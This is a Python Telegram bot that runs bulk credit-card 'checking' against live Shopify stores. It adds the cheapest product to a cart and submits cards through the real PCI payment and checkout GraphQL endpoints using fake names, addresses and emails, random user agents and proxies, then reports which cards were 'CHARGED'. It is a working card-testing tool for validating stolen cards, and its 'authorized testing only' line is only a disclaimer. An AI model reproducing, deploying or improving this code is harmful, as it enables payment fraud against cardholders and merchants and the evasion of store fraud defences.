#!/usr/bin/env python3
"""
👑 HIS MAJESTY'S SHOPIFY CHECKOUT BOT – TELEGRAM CONTROLLER
Full integration of original checkout engine with Telegram interface
Deployment-optimized for Railway.app
"""

import os
import sys
import logging
import asyncio
import json
import random
import string
import re
import time
import uuid
import ssl
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote
from typing import Dict, Tuple, Optional, List, Any

import requests
import urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== ROYAL CONFIGURATION ==========
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
ADMIN_IDS = [int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
USE_PROXY = os.environ.get("USE_PROXY", "False").lower() == "true"
PROXY_RAW = os.environ.get("PROXY_URL", "")

# Timeout constants (from original script)
TIMEOUT_FAST = 30
TIMEOUT_SUBMIT = 60
TIMEOUT_POLL = 20

# Thread-safe storage
charged_cards = []
print_lock = threading.Lock()
results_lock = threading.Lock()

# Bot statistics
stats = {
    "total_checked": 0,
    "charged": 0,
    "declined": 0,
    "errors": 0,
    "start_time": datetime.now()
}

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== PROXY MANAGEMENT ==========
def parse_proxy(proxy_str: str) -> Optional[str]:
    """Parse proxy string to URL format"""
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    return None

PROXY_URL = parse_proxy(PROXY_RAW)

def create_proxy_session(proxy_url: str = None):
    """Create requests session with optional proxy"""
    session = requests.Session()
    if USE_PROXY and (proxy_url or PROXY_URL):
        session.proxies = {"http": proxy_url or PROXY_URL, "https": proxy_url or PROXY_URL}
        session.verify = False
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=2)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

# ========== UTILITY FUNCTIONS ==========
def random_string(length: int = 8) -> str:
    """Generate random alphanumeric string"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def random_name() -> Tuple[str, str]:
    """Generate random first and last name"""
    first = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily', 'James', 'Emma', 'Robert', 'Olivia']
    last = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Wilson', 'Taylor']
    return random.choice(first), random.choice(last)

def random_address() -> Dict[str, str]:
    """Generate random US address"""
    data = [
        ('1600 Pennsylvania Ave NW', '', 'Washington', 'DC', '20500', '202'),
        ('350 Fifth Avenue', '', 'New York', 'NY', '10118', '212'),
        ('233 S Wacker Dr', '', 'Chicago', 'IL', '60606', '312'),
        ('1 Infinite Loop', '', 'Cupertino', 'CA', '95014', '408'),
        ('1 Microsoft Way', '', 'Redmond', 'WA', '98052', '425'),
    ]
    addr = random.choice(data)
    phone = f"+1{addr[5]}{random.randint(200,999)}{random.randint(1000,9999)}"
    return {
        'address1': addr[0], 'address2': addr[1], 'city': addr[2], 
        'countryCode': 'US', 'postalCode': addr[4], 'zoneCode': addr[3], 
        'phone': phone
    }

def random_ua() -> str:
    """Generate random Chrome user agent"""
    chrome_ver = f"{random.randint(100,120)}.0.{random.randint(1000,9999)}.{random.randint(10,200)}"
    return f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36'

# ========== CORE SHOPIFY FUNCTIONS ==========
def find_cheapest_product(site: str, proxy_override: str = None):
    """Find cheapest product on Shopify store"""
    session = create_proxy_session(proxy_override)
    session.headers.update({"User-Agent": random_ua()})
    
    try:
        resp = session.get(f"https://{site}/products.json?limit=250", timeout=15)
        if resp.status_code != 200:
            return None, None, None, "PRODUCTS_FETCH_FAILED"
        
        products = resp.json().get('products', [])
        cheapest_variant = None
        cheapest_price = float('inf')
        product_handle = None
        
        for product in products:
            for variant in product.get('variants', []):
                price = float(variant.get('price', 999999))
                if 0 < price < cheapest_price:
                    cheapest_price = price
                    cheapest_variant = variant['id']
                    product_handle = product.get('handle', '')
        
        if not cheapest_variant:
            return None, None, None, "NO_PRODUCT_FOUND"
        
        return cheapest_variant, cheapest_price, product_handle, "OK"
    except Exception as e:
        return None, None, None, str(e)[:50]

def create_checkout_session(site: str, variant_id: int, product_handle: str, proxy_override: str = None):
    """Create Shopify checkout session"""
    ua = random_ua()
    session = create_proxy_session(proxy_override)
    session.headers.update({"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
    
    try:
        headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}', 'user-agent': ua}
        resp = session.post(f'https://{site}/cart/add.js', headers=headers, json={'items': [{'id': int(variant_id), 'quantity': 1}]}, timeout=TIMEOUT_FAST)
        if resp.status_code != 200:
            resp = session.post(f'https://{site}/cart/add', data={'id': str(variant_id), 'quantity': '1'}, timeout=TIMEOUT_FAST)
            if resp.status_code != 200:
                return None, 'ERROR', 'ADD_TO_CART_FAILED'
        
        resp = session.post(f'https://{site}/cart', data={'updates[]': '1', 'checkout': ''}, allow_redirects=True, timeout=TIMEOUT_FAST)
        if 'checkout' not in resp.url:
            return None, 'ERROR', 'CHECKOUT_REDIRECT_FAILED'
        
        checkout_resp = session.get(resp.url, allow_redirects=True, timeout=TIMEOUT_FAST)
        checkout_text = checkout_resp.text
        
        lower = checkout_text.lower()
        if 'verifying your connection' in lower or 'checking your browser' in lower:
            return None, 'VERIFY', 'VERIFY_BROWSER'
        if 'access denied' in lower:
            return None, 'BLOCKED', 'ACCESS_DENIED'
        
        sig_patterns = [
            r'checkoutCardsinkCallerIdentificationSignature[&quot;:]+([^&"]+)',
            r'"checkoutCardsinkCallerIdentificationSignature"\s*:\s*"([^"]+)"',
            r'callerIdentificationSignature["\s:]+([^"&\s]+)',
        ]
        shopify_sig = None
        for pattern in sig_patterns:
            m = re.search(pattern, checkout_text)
            if m:
                shopify_sig = m.group(1).replace('&quot;', '').strip()
                if shopify_sig and len(shopify_sig) > 10:
                    break
                shopify_sig = None
        
        if not shopify_sig:
            return None, 'ERROR', 'NO_SIGNATURE'
        
        m = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', checkout_text)
        session_token = m.group(1).replace('&quot;', '').strip() if m else None
        
        m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', checkout_text)
        queue_token = m.group(1) if m else None
        
        m = re.search(r'"stableId"\s*:\s*"([a-f0-9-]{36})"', checkout_text)
        stable_id = m.group(1) if m else str(uuid.uuid4())
        
        m = re.search(r'/checkouts/cn/([^/]+)/', checkout_resp.url) or re.search(r'/checkouts/([^/]+)/', checkout_resp.url)
        checkout_source_id = m.group(1) if m else ''
        
        m = re.search(r'x-checkout-web-build-id[&quot;:]+([a-f0-9]+)', checkout_text)
        build_id = m.group(1) if m else 'fb347c24d80acb8076f676fa55018bb00cddfde9'
        
        m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', checkout_text)
        payment_method_id = m.group(1) if m else None
        
        return {
            'site': site, 'session': session, 'ua': ua, 'sig': shopify_sig,
            'session_token': session_token, 'queue_token': queue_token, 'stable_id': stable_id,
            'checkout_source_id': checkout_source_id, 'build_id': build_id, 'payment_method_id': payment_method_id,
            'checkout_url': checkout_resp.url
        }, 'OK', 'READY'
        
    except Exception as e:
        return None, 'ERROR', str(e)[:30]

def check_card(checkout_data: Dict, card: str, index: int, total: int, 
               variant_id: int, price: float, require_shipping: bool = None, proxy_override: str = None):
    """Check credit card on Shopify checkout"""
    try:
        parts = card.split("|")
        card_number, month = parts[0], int(parts[1])
        year = int("20" + parts[2]) if len(parts[2]) == 2 else int(parts[2])
        cvv = parts[3].strip()
        
        site = checkout_data['site']
        session = checkout_data['session']
        ua = checkout_data['ua']
        sig = checkout_data['sig']
        session_token = checkout_data['session_token']
        queue_token = checkout_data['queue_token']
        stable_id = checkout_data['stable_id']
        checkout_source_id = checkout_data['checkout_source_id']
        build_id = checkout_data['build_id']
        payment_method_id = checkout_data['payment_method_id']
        checkout_url = checkout_data['checkout_url']
        
        first_name, last_name = random_name()
        cardholder = f"{first_name} {last_name}"
        email = f"{first_name.lower()}{last_name.lower()}{random.randint(10,999)}@gmail.com"
        addr = random_address()
        addr['firstName'], addr['lastName'] = first_name, last_name
        
        pay_session = create_proxy_session(proxy_override)
        pay_headers = {'accept': 'application/json', 'content-type': 'application/json', 
                       'origin': 'https://checkout.pci.shopifyinc.com', 'shopify-identification-signature': sig, 'user-agent': ua}
        pay_json = {'credit_card': {'number': card_number, 'month': month, 'year': year, 'verification_value': cvv, 
                    'name': cardholder}, 'payment_session_scope': site.replace('www.', '')}
        
        resp = pay_session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pay_headers, json=pay_json, timeout=TIMEOUT_FAST)
        if resp.status_code != 200:
            return (index, total, card, 'ERROR', 'PCI_FAILED', price)
        
        payment_session_id = resp.json().get('id')
        if not payment_session_id:
            return (index, total, card, 'ERROR', 'NO_SESSION_ID', price)
        
        if require_shipping:
            delivery = {
                'deliveryLines': [{'destination': {'streetAddress': addr},
                    'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}],
                'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True
            }
        else:
            delivery = {
                'deliveryLines': [{'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['NONE'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False}],
                'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True
            }
        
        gql_headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}',
            'referer': checkout_url, 'user-agent': ua, 'x-checkout-one-session-token': session_token or '',
            'x-checkout-web-build-id': build_id, 'x-checkout-web-source-id': checkout_source_id}
        
        gql_data = {
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': session_token or ''}, 'queueToken': queue_token or '',
                    'delivery': delivery,
                    'merchandise': {'merchandiseLines': [{'stableId': stable_id, 
                        'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}', 
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': []}},
                        'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}}]},
                    'payment': {'totalAmount': {'any': True}, 
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id or '', 
                            'sessionId': payment_session_id, 'billingAddress': {'streetAddress': addr}}}, 'amount': {'any': True}}],
                        'billingAddress': {'streetAddress': addr}},
                    'buyerIdentity': {'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'}, 'email': email},
                    'taxes': {'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}}},
                    'tip': {'tipLines': []}, 'note': {'message': None, 'customAttributes': []},
                },
                'attemptToken': f"{checkout_source_id}-{random_string(11)}",
            },
            'operationName': 'SubmitForCompletion',
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{...R}}...on SubmitAlreadyAccepted{receipt{...R}}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...R}}}}fragment R on Receipt{__typename ...on ProcessedReceipt{id redirectUrl orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}}__typename}}'
        }
        
        resp = session.post(f'https://{site}/checkouts/unstable/graphql', params={'operationName': 'SubmitForCompletion'}, 
                           headers=gql_headers, json=gql_data, timeout=TIMEOUT_SUBMIT)
        
        if resp.status_code != 200:
            return (index, total, card, 'ERROR', f'HTTP_{resp.status_code}', price)
        
        result = resp.json()
        resp_text = resp.text.lower()
        
        if 'errors' in result:
            err = result['errors'][0].get('message', 'ERROR')[:40]
            if 'delivery' in err.lower() and require_shipping is None:
                return check_card(checkout_data, card, index, total, variant_id, price, True, proxy_override)
            return (index, total, card, 'ERROR', err, price)
        
        completion = result.get('data', {}).get('submitForCompletion', {})
        if not completion:
            if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
                return (index, total, card, 'DECLINED', 'CARD_DECLINED', price)
            if 'insufficient' in resp_text:
                return (index, total, card, 'DECLINED', 'INSUFFICIENT_FUNDS', price)
            return (index, total, card, 'ERROR', 'NO_COMPLETION', price)
        
        typename = completion.get('__typename', '')
        
        if not typename:
            if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
                return (index, total, card, 'DECLINED', 'CARD_DECLINED', price)
            if 'insufficient' in resp_text:
                return (index, total, card, 'DECLINED', 'INSUFFICIENT_FUNDS', price)
            if 'expired' in resp_text:
                return (index, total, card, 'DECLINED', 'EXPIRED_CARD', price)
            if 'invalid' in resp_text:
                return (index, total, card, 'DECLINED', 'INVALID_CARD', price)
            return (index, total, card, 'ERROR', resp.text[:50].replace('\n', ' '), price)
        
        if typename == 'SubmitRejected':
            errors = completion.get('errors', [])
            if errors:
                err = errors[0].get('code', errors[0].get('localizedMessage', 'REJECTED'))
                if 'DELIVERY' in err and require_shipping is None:
                    return check_card(checkout_data, card, index, total, variant_id, price, True, proxy_override)
                return (index, total, card, 'DECLINED', err, price)
            return (index, total, card, 'DECLINED', 'REJECTED', price)
        
        if typename == 'SubmitFailed':
            return (index, total, card, 'DECLINED', completion.get('reason', 'FAILED'), price)
        
        receipt = completion.get('receipt', {})
        receipt_type = receipt.get('__typename', '')
        receipt_id = receipt.get('id')
        
        if receipt_type == 'ProcessedReceipt' or receipt.get('orderStatusPageUrl'):
            return (index, total, card, 'CHARGED', 'ORDER_PLACED', price)
        
        if receipt_type == 'FailedReceipt':
            err = receipt.get('processingError', {}).get('code', 'FAILED')
            return (index, total, card, 'DECLINED', err, price)
        
        if receipt_id and receipt_type in ['ProcessingReceipt', 'WaitingReceipt', '']:
            poll_query = 'query Poll($id:ID!,$token:String!){receipt(receiptId:$id,sessionInput:{sessionToken:$token}){__typename ...on ProcessedReceipt{id orderStatusPageUrl}...on FailedReceipt{processingError{...on PaymentFailed{code}}}}}'
            for _ in range(15):
                time.sleep(2)
                try:
                    poll_resp = session.post(f'https://{site}/checkouts/unstable/graphql', headers=gql_headers,
                        json={'variables': {'id': receipt_id, 'token': session_token or ''}, 'operationName': 'Poll', 'query': poll_query}, timeout=TIMEOUT_POLL)
                    if poll_resp.status_code == 200:
                        poll_data = poll_resp.json().get('data', {}).get('receipt', {})
                        poll_type = poll_data.get('__typename', '')
                        
                        if poll_type == 'ProcessedReceipt' and poll_data.get('orderStatusPageUrl'):
                            return (index, total, card, 'CHARGED', 'ORDER_PLACED', price)
                        
                        if poll_type == 'FailedReceipt':
                            err = poll_data.get('processingError', {}).get('code', 'PAYMENT_FAILED')
                            return (index, total, card, 'DECLINED', err, price)
                        
                        if poll_type in ['ProcessingReceipt', 'WaitingReceipt']:
                            continue
                except:
                    pass
            return (index, total, card, 'ERROR', 'POLL_TIMEOUT', price)
        
        if typename == 'Throttled':
            return (index, total, card, 'ERROR', 'THROTTLED', price)
        
        if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
            return (index, total, card, 'DECLINED', 'CARD_DECLINED', price)
        if 'insufficient' in resp_text:
            return (index, total, card, 'DECLINED', 'INSUFFICIENT_FUNDS', price)
        
        return (index, total, card, 'ERROR', typename if typename else resp.text[:40].replace('\n', ' '), price)
        
    except Exception as e:
        return (index, total, card, 'ERROR', str(e)[:40], price)

def process_card(args: Tuple) -> Tuple:
    """Process single card - wrapper for threading"""
    card, index, total, site, variant_id, price, product_handle, proxy_override = args
    
    checkout_data, status, msg = create_checkout_session(site, variant_id, product_handle, proxy_override)
    
    if status != 'OK':
        return (index, total, card, status, msg, price)
    
    return check_card(checkout_data, card, index, total, variant_id, price, None, proxy_override)

# ========== TELEGRAM BOT HANDLERS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Royal welcome command"""
    user_id = update.effective_user.id
    if ADMIN_IDS and user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized. His Majesty has not granted you access.")
        return
    
    await update.message.reply_text(
        "👑 **HIS MAJESTY'S SHOPIFY CHECKOUT BOT**\n\n"
        "⚡ **Full checkout engine integrated**\n"
        "🎯 **Direct Shopify API manipulation**\n"
        "🔐 **PCI session bypass**\n\n"
        "**Commands:**\n"
        "`/check <site> <card>` - Check single card\n"
        "`/mass <site>` - Upload file with cards\n"
        "`/find <site>` - Find cheapest product\n"
        "`/stats` - Show bot statistics\n"
        "`/help` - Show this message\n\n"
        "**Card format:** `number|month|year|cvv`\n"
        "**Example:** `/check mystore.com 4111111111111111|12|26|123`\n\n"
        "*For authorized testing only*",
        parse_mode=ParseMode.MARKDOWN
    )

async def find_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Find cheapest product on a store"""
    user_id = update.effective_user.id
    if ADMIN_IDS and user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/find <site>`\nExample: `/find mystore.shopify.com`", parse_mode=ParseMode.MARKDOWN)
        return
    
    site = context.args[0].replace("https://", "").replace("http://", "").strip().rstrip("/")
    
    msg = await update.message.reply_text(f"🔍 Scanning `{site}` for cheapest product...", parse_mode=ParseMode.MARKDOWN)
    
    loop = asyncio.get_event_loop()
    variant_id, price, handle, status = await loop.run_in_executor(None, find_cheapest_product, site, None)
    
    if variant_id:
        await msg.edit_text(
            f"✅ **Found on {site}**\n"
            f"💰 Price: `${price:.2f}`\n"
            f"📦 Product: `{handle}`\n"
            f"🔢 Variant ID: `{variant_id}`",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await msg.edit_text(f"❌ Failed: `{status}`", parse_mode=ParseMode.MARKDOWN)

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check a single card with full Shopify engine"""
    user_id = update.effective_user.id
    if ADMIN_IDS and user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: `/check <site> <card>`\n"
            "Example: `/check mystore.com 4111111111111111|12|26|123`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    site = context.args[0].replace("https://", "").replace("http://", "").strip()
    card = context.args[1].strip()
    
    if '|' not in card or len(card.split('|')) < 4:
        await update.message.reply_text("❌ Invalid card format. Use: `number|month|year|cvv`", parse_mode=ParseMode.MARKDOWN)
        return
    
    msg = await update.message.reply_text(f"🔄 **Checking card on {site}...**\n\n⚡ Full checkout simulation in progress...", parse_mode=ParseMode.MARKDOWN)
    
    variant_id, price, handle, status = find_cheapest_product(site)
    if not variant_id:
        await msg.edit_text(f"❌ Failed to find product on {site}: `{status}`", parse_mode=ParseMode.MARKDOWN)
        return
    
    await msg.edit_text(f"🔄 **Found product:** `${price:.2f}`\n🔄 **Processing card...**")
    
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(
        None, 
        lambda: process_card((card, 1, 1, site, variant_id, price, handle, None))
    )
    
    idx, tot, card_display, res_status, res_msg, res_price = result[:6]
    
    global stats
    stats["total_checked"] += 1
    if res_status == "CHARGED":
        stats["charged"] += 1
        emoji = "✅💰"
    elif res_status == "DECLINED":
        stats["declined"] += 1
        emoji = "❌"
    else:
        stats["errors"] += 1
        emoji = "⚠️"
    
    card_masked = card[:8] + "****" + card[-4:] if len(card) > 12 else card[:4] + "****" + card[-4:]
    
    await msg.edit_text(
        f"{emoji} **Card Result**\n\n"
        f"🏪 **Site:** `{site}`\n"
        f"💳 **Card:** `{card_masked}`\n"
        f"💰 **Price:** `${res_price:.2f}`\n"
        f"📊 **Status:** `{res_status}`\n"
        f"📝 **Message:** `{res_msg}`\n"
        f"🕐 **Time:** `{datetime.now().strftime('%H:%M:%S')}`\n\n"
        f"🔧 **Variant ID:** `{variant_id}`",
        parse_mode=ParseMode.MARKDOWN
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics"""
    user_id = update.effective_user.id
    if ADMIN_IDS and user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    uptime = datetime.now() - stats["start_time"]
    hours = uptime.total_seconds() // 3600
    minutes = (uptime.total_seconds() % 3600) // 60
    
    success_rate = stats["charged"] / max(1, stats["total_checked"]) * 100
    
    await update.message.reply_text(
        f"📊 **Royal Statistics**\n\n"
        f"✅ **Total checked:** `{stats['total_checked']}`\n"
        f"💰 **Charged:** `{stats['charged']}`\n"
        f"❌ **Declined:** `{stats['declined']}`\n"
        f"⚠️ **Errors:** `{stats['errors']}`\n"
        f"📈 **Success rate:** `{success_rate:.1f}%`\n\n"
        f"⏱️ **Uptime:** `{int(hours)}h {int(minutes)}m`\n"
        f"⚙️ **Status:** `ONLINE`\n"
        f"👑 **Serving His Majesty**",
        parse_mode=ParseMode.MARKDOWN
    )

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file upload for mass card checking"""
    user_id = update.effective_user.id
    if ADMIN_IDS and user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/mass <site>`\nThen upload a `.txt` file with cards", parse_mode=ParseMode.MARKDOWN)
        return
    
    site = context.args[0].replace("https://", "").replace("http://", "").strip()
    context.user_data['mass_site'] = site
    
    await update.message.reply_text(
        f"📤 **Upload a `.txt` file** containing cards (one per line)\n\n"
        f"**Format:** `number|month|year|cvv`\n"
        f"**Target site:** `{site}`\n\n"
        f"*Example line:* `4111111111111111|12|2026|123`",
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process uploaded card file with full Shopify engine"""
    user_id = update.effective_user.id
    if ADMIN_IDS and user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    site = context.user_data.get('mass_site')
    if not site:
        await update.message.reply_text("❌ First use `/mass <site>` command.")
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a `.txt` file.")
        return
    
    msg = await update.message.reply_text(f"📥 **Downloading and processing file...**\n\nTarget: `{site}`", parse_mode=ParseMode.MARKDOWN)
    
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    cards = file_content.decode('utf-8').strip().split('\n')
    cards = [c.strip() for c in cards if c.strip() and '|' in c]
    
    if not cards:
        await msg.edit_text("❌ No valid cards found in file.")
        return
    
    await msg.edit_text(f"🔄 **Finding cheapest product on {site}...**")
    
    variant_id, price, handle, status = find_cheapest_product(site)
    if not variant_id:
        await msg.edit_text(f"❌ Failed to find product: `{status}`", parse_mode=ParseMode.MARKDOWN)
        return
    
    await msg.edit_text(
        f"✅ **Product found: `${price:.2f}`**\n"
        f"🔄 **Checking {len(cards)} cards on {site}...**\n\n"
        f"*Results will appear as they complete*",
        parse_mode=ParseMode.MARKDOWN
    )
    
    charged_list = []
    tasks = [(card, idx, len(cards), site, variant_id, price, handle, None) for idx, card in enumerate(cards, 1)]
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(process_card, task): task for task in tasks}
        
        for future in as_completed(futures):
            try:
                result = future.result()
                idx, tot, card_display, res_status, res_msg, res_price = result[:6]
                
                stats["total_checked"] += 1
                if res_status == "CHARGED":
                    stats["charged"] += 1
                    charged_list.append(card_display)
                    await update.message.reply_text(
                        f"✅💰 **CHARGED!**\n"
                        f"💳 `{card_display[:12]}...`\n"
                        f"💰 `${res_price:.2f}`",
                        parse_mode=ParseMode.MARKDOWN
                    )
                elif res_status == "DECLINED":
                    stats["declined"] += 1
                else:
                    stats["errors"] += 1
                
                if idx % 5 == 0 or idx == tot:
                    await msg.edit_text(
                        f"✅ **Product:** `${price:.2f}`\n"
                        f"🔄 **Progress:** `{idx}/{tot}` cards\n"
                        f"💰 **Charged:** `{len(charged_list)}`",
                        parse_mode=ParseMode.MARKDOWN
                    )
                    
            except Exception as e:
                logger.error(f"Thread error: {e}")
    
    success_rate = stats["charged"] / max(1, stats["total_checked"]) * 100
    await update.message.reply_text(
        f"📊 **MASS CHECK COMPLETE**\n\n"
        f"🏪 **Site:** `{site}`\n"
        f"💰 **Product price:** `${price:.2f}`\n"
        f"📇 **Cards processed:** `{len(cards)}`\n"
        f"✅ **CHARGED:** `{len(charged_list)}`\n"
        f"📈 **Success rate:** `{success_rate:.1f}%`\n\n"
        f"👑 **Serving His Majesty the King of the World**",
        parse_mode=ParseMode.MARKDOWN
    )
    
    context.user_data.pop('mass_site', None)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help message"""
    user_id = update.effective_user.id
    if ADMIN_IDS and user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    await update.message.reply_text(
        "👑 **Royal Commands - Full Shopify Engine**\n\n"
        "**Core Commands:**\n"
        "`/start` - Welcome & status\n"
        "`/find <site>` - Find cheapest product\n"
        "`/check <site> <card>` - Single card validation\n"
        "`/mass <site>` - Bulk card upload (.txt)\n"
        "`/stats` - Performance metrics\n"
        "`/help` - This manifest\n\n"
        "**Card Format:**\n"
        "`number|month|year|cvv`\n"
        "`4111111111111111|12|2026|123`\n\n"
        "⚠️ **Authorized testing only**\n"
        "👑 **His Majesty's Personal Tool**",
        parse_mode=ParseMode.MARKDOWN
    )

# ========== MAIN FUNCTION – RAILWAY READY ==========
def main():
    """Royal main – handles Railway deployment with full engine"""
    if not TOKEN:
        print("❌ CRITICAL: TELEGRAM_BOT_TOKEN environment variable not set!")
        print("Set it in Railway dashboard: Variables -> Add Variable")
        sys.exit(1)
    
    if not ADMIN_IDS:
        print("⚠️ WARNING: No ADMIN_IDS set. Anyone can use this bot.")
        print("Set ADMIN_IDS in Railway: comma-separated numeric IDs")
    
    print("=" * 60)
    print("👑 HIS MAJESTY'S SHOPIFY CHECKOUT BOT")
    print("=" * 60)
    print(f"🤖 Bot Token: {TOKEN[:10]}...{TOKEN[-5:]}")
    print(f"👥 Admin IDs: {ADMIN_IDS}")
    print(f"🌐 Proxy Enabled: {USE_PROXY}")
    print("=" * 60)
    print("🟢 INITIALIZING TELEGRAM HANDLERS...")
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("find", find_command))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ ALL HANDLERS REGISTERED")
    print("🟢 BOT ONLINE – READY FOR ROYAL COMMANDS")
    print("👑 SERVING HIS MAJESTY THE KING OF THE WORLD")
    print("=" * 60)
    
    try:
        app.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True,
            stop_signals=None
        )
    except KeyboardInterrupt:
        print("\n⏹️ Bot stopped by royal command")
    except Exception as e:
        print(f"❌ FATAL ERROR: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
